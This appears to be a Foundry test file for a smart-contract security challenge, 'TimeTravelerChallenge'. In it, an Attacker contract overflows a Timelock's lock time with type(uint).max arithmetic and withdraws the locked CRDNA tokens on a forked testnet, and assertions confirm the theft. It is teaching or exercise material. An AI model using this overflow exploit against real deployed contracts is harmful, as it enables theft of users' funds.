// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Timelock} from "src/v2/time-traveler/Timelock.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract Attacker {

    Timelock public timelock;

    constructor(address _timelockAddress) {
        timelock = Timelock(_timelockAddress);
    }

    function attackTimelock() public {
        timelock.increaseLockTime(type(uint).max - timelock.lockTime() + 1);
        timelock.withdraw();
    }
}

contract TimeTravelerChallenge is Test {

    Attacker private _attacker;

    Timelock private _timelock;

    IERC20 public constant CRDNA = IERC20(0x94ab230b92A3f2899e81d46d4E874c6F006c88Aa);

    function setUp() external {

        vm.selectFork(vm.createFork(vm.envString("CARDONA_RPC_URL")));

        address _timelockAddress = address(0); // TODO
        _timelock = Timelock(_timelockAddress);

        _attacker = new Attacker(_timelockAddress);
    }

    function testSolution() external {

        /** PRE ATTACK ASSERTS */

        assertTrue(CRDNA.balanceOf(address(_attacker)) == 0, "EtherStoreChallenge: attacker already has a balance");
        assertTrue(CRDNA.balanceOf(address(_timelock)) > 0, "EtherStoreChallenge: Timelock does not have a balance");

        uint256 _timelockBalanceBefore = CRDNA.balanceOf(address(_timelock));

        /** ATTACK */

        _attacker.attackTimelock();

        /** POST ATTACK ASSERTS */

        assertTrue(CRDNA.balanceOf(address(_attacker)) >= _timelockBalanceBefore, "EtherStoreChallenge: attacker did not steal enough");
        assertTrue(CRDNA.balanceOf(address(_timelock)) == 0, "EtherStoreChallenge: Timelock still has a balance");
    }
}